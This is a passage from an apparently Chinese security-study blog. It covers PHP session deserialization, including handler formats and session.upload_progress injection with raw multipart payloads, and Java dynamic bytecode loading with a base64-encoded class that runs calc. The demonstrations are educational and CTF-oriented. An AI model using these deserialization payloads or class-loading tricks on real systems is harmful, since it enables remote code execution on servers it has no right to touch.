<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>如图所示：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422192647948.png" alt="image-20240422192647948"></p>
<p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p>
<p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p>
<h6 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h6><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p>
<p>demo改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionseesionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422193133901.png" alt="image-20240422193133901"></p>
<p>两张图片可以对比一下</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200413609.png" alt="image-20240422200413609"></p>
<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p>
<p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200554081.png" alt="image-20240422200554081"></p>
<p><code>sessionsessionsessionsessionsessions</code>是键名,</p>
<p><strong>注意：</strong>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少。</p>
<p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p>
<h6 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h6><p>demo如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>测试结果：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422201421239.png" alt="image-20240422201421239"></p>
<p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p>
<p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p>
<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="自建环境测试"><a href="#自建环境测试" class="headerlink" title="自建环境测试"></a>自建环境测试</h6><p>建造一个环境，有两个文件，分别如下：</p>
<p>flag.php：</p>
<p>这个页面用于接受session的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.php：</p>
<p>这个页面用于测试反序</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先访问1.php，输出</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203335935.png" alt="image-20240423203335935"></p>
<p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202531645.png" alt="image-20240425202531645"></p>
<p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203811665.png" alt="image-20240423203811665"></p>
<p>在电脑上看一看此时session的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到成功写入，这是再访问以下1.php</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202506406.png" alt="image-20240425202506406"></p>
<p>成功反序。</p>
<p><strong>但是这里的局限性太大，有如下条件：</strong></p>
<ul>
<li>两个文件session引擎配置不同</li>
<li>其中一个session可控</li>
<li>两个文件同域</li>
</ul>
<p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p>
<h6 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h6><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p>
<p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p>
<p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p>
<p>条件：</p>
<ol>
<li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li>
<li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li>
</ol>
<p>这两个都是可在查的</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423211803946.png" alt="image-20240423211803946"></p>
<p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们<u>可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据</u>。我们就可以控制这个数据内容为我们的恶意payload</p>
<p><strong>对session上传进度说明一下：</strong></p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1647333728_62305160591d530edf695.jpeg" alt="image-20220315161551104"></p>
<p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure>

<p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p>
<p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure>

<p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p>
<h6 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h6><p><strong>同样需要php≥5.4</strong></p>
<p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>

<p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，<u>表示当文件上传结束后，php将会立即清空对应session文件中的内容</u>，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p>
<p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p>
<p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p>
<p>开始解析：</p>
<ul>
<li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li>
<li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li>
</ul>
<p>脚本后面补，遇到题再搓出来。</p>
<p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p>
<p>其他例题参考：<br>1.简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p>
]]></content>
      <categories>
        <category>php相关漏洞</category>
        <category>php反序列化</category>
        <category>session反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>动态加载字节码</title>
    <url>/2024/06/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    <content><![CDATA[<h1 id="动态加载字节码"><a href="#动态加载字节码" class="headerlink" title="动态加载字节码"></a>动态加载字节码</h1><p>Java字节码指的是JVM执行使用的一类指令，通常被存储在<code>.class</code>文件中。</p>
<span id="more"></span>

<h2 id="加载远程-本地文件"><a href="#加载远程-本地文件" class="headerlink" title="加载远程&#x2F;本地文件"></a>加载远程&#x2F;本地文件</h2><p>在前面类加载机制的学习中，我们知道URLClassLoader是AppClassLoader的父类。</p>
<p>通常情况下,Java会根据配置项sun.boot.class.path和java.class.path中列举的基础路径（这些路径是经过处理后的java.net.URL类）来寻找<code>.class</code>文件来加载，这个基础路径有分三种情况：</p>
<ul>
<li>URL未以斜杠<code>/</code>结尾，则认为是一个Jar文件，使用JarLoader来寻找类，即在Jar包上寻找类。</li>
<li>URL以<code>/</code>结尾，且协议名为file，则使用FileLoader来寻找类，即在本地系统中寻找<code>.class</code>文件</li>
<li>URL以斜杠<code>/</code>结尾，且协议名不为file，则使用最基础的Loader来寻找类</li>
</ul>
<p><strong>本地加载<code>.class</code>文件</strong></p>
<p>Test.java内容：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;haha&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main.java内容;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file://D:\\java_text\\java-1\\src&quot;</span>)&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">z</span> <span class="operator">=</span> x.loadClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        z.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先使用javac将Test.java打成Test.class，然后再运行Main.java成功在控制台输出haha。</p>
<p><strong>远程加载<code>.class</code>文件</strong></p>
<p>其实都是差不多的，自己编写一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        URL[] url = <span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://url:port/&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(url);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">x</span> <span class="operator">=</span> urls.loadClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        x.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加载到的<code>.class</code>文件会执行其字节码</p>
<h2 id="利用defineClass-直接加载字节码"><a href="#利用defineClass-直接加载字节码" class="headerlink" title="利用defineClass()直接加载字节码"></a>利用defineClass()直接加载字节码</h2><p>Java加载都需要经过：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader.loadClass  -&gt;  ClassLoader.findClass  -&gt;  ClassLoader.defineClass</span><br></pre></td></tr></table></figure>

<p>其中：</p>
<ul>
<li>loadClass的作用是从已经加载的类缓存、父加载器等位置寻找类（双亲委派机制），在前面没有找到的情况下执行findClass</li>
<li>findClass的·作用就是根据基础URL制定的方式来查找类，读取字节码后交给defineClass</li>
<li><strong>defineClass的作用是处理前面传入的字节码，将其处理成真正的Java类</strong></li>
</ul>
<p>defineClass决定如何将一段字节流转换变成一个Java类，Java默认的ClassLoader.defineClass是一个native方法（C语言实现）</p>
<p><img src="/2024/06/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240620201446204.png" alt="image-20240620201446204"></p>
<p><strong>利用方法如下：</strong></p>
<p>利用反射获取defineClass方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> class &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,String.class,<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>此时Test.java内容为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">x</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="type">String</span> <span class="variable">y</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">            x.exec(y);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将其转换为class文件后再转换为base64编码，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 指定 class 文件的路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">classFilePath</span> <span class="operator">=</span> <span class="string">&quot;D:\\java_text\\java-1\\out\\production\\java-1\\Test.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 读取 class 文件的二进制数据</span></span><br><span class="line">            <span class="type">byte</span>[] classData = Files.readAllBytes(Paths.get(classFilePath));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将二进制数据编码为 Base64 字符串</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(classData);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出 Base64 字符串</span></span><br><span class="line">            System.out.println(base64Encoded);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//也可以javac编译，然后cat输出是Base64编码一下，就是需要注意idea和javac运行的JDK版本要相同。</span></span><br></pre></td></tr></table></figure>

<p>再使用base64解码就可以得到完整的字节码了，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAKgoACAAbCgAcAB0IAB4KABwAHwcAIAoABQAhBwAiBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAAg8Y2xpbml0PgEAAXgBABNMamF2YS9sYW5nL1J1bnRpbWU7AQABeQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAgAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACQAKBwAkDAAlACYBAARjYWxjDAAnACgBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAApAAoBAARUZXN0AQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAEAA0AAAAMAAEAAAAFAA4ADwAAAAgAEAAKAAEACwAAAIEAAgACAAAAFrgAAksSA0wqK7YABFenAAhLKrYABrEAAQAAAA0AEAAFAAMADAAAAB4ABwAAAAcABAAIAAcACQANAAwAEAAKABEACwAVAA0ADQAAACAAAwAEAAkAEQASAAAABwAGABMAFAABABEABAAVABYAAAAXAAAABwACUAcAGAQAAQAZAAAAAgAa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>加载字节码成Class对象，然后实例化拿到一个对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">Test</span> <span class="operator">=</span> (Class)method.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Test&quot;</span>, code, <span class="number">0</span>, code.length);    <span class="comment">//ClassLoader.getSystemClassLoader()返回系统的类加载器对象</span></span><br><span class="line">Test.newInstance();</span><br></pre></td></tr></table></figure>

<p>完整的POC如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALgoACAAfCgAgACEIACIKACAAIwcAJAoABQAlBwAmBwAnAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAIPGNsaW5pdD4BAAF4AQATTGphdmEvbGFuZy9SdW50aW1lOwEAAXkBABJMamF2YS9sYW5nL1N0cmluZzsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAJAEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAkACgcAKAwAKQAqAQAEY2FsYwwAKwAsAQATamF2YS9pby9JT0V4Y2VwdGlvbgwALQAKAQAEVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAADAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAABAANAAAADAABAAAABQAOAA8AAAAJABAAEQABAAsAAAArAAAAAQAAAAGxAAAAAgAMAAAABgABAAAAEQANAAAADAABAAAAAQASABMAAAAIABQACgABAAsAAACBAAIAAgAAABa4AAJLEgNMKiu2AARXpwAISyq2AAaxAAEAAAANABAABQADAAwAAAAeAAcAAAAHAAQACAAHAAkADQAMABAACgARAAsAFQANAA0AAAAgAAMABAAJABUAFgAAAAcABgAXABgAAQARAAQAGQAaA